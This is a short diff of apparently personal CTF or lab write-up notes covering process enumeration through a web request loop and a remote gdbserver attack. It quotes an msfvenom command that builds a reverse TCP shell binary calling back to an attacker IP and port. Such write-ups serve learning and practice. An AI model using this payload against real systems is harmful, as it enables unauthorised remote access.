@@ -36,7 +36,7 @@ hudson:x:1001:1001::/home/hudson:/bin/bash
 -> we can access any running process if we know the process number 
 -> so we can run a python script to generate 1 to n numbers and send a get request , if we get the 200 on a perticular request it means that process is running , we might get somthing in processes , if we are unable to find nothing
 
--> python script {taken it from google}
+-> python script 
 ```
 import requests  
   
@@ -83,6 +83,7 @@ else:
 ##### GdbServer Vulnerability 
 
 -> enumerated -> found hacktrickz article 
+-> https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver?ref=benheater.com
 ```
 # Trick shared by @B1n4rySh4d0w
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.127.143 LPORT=4444 PrependFork=true -f elf -o binary.elf
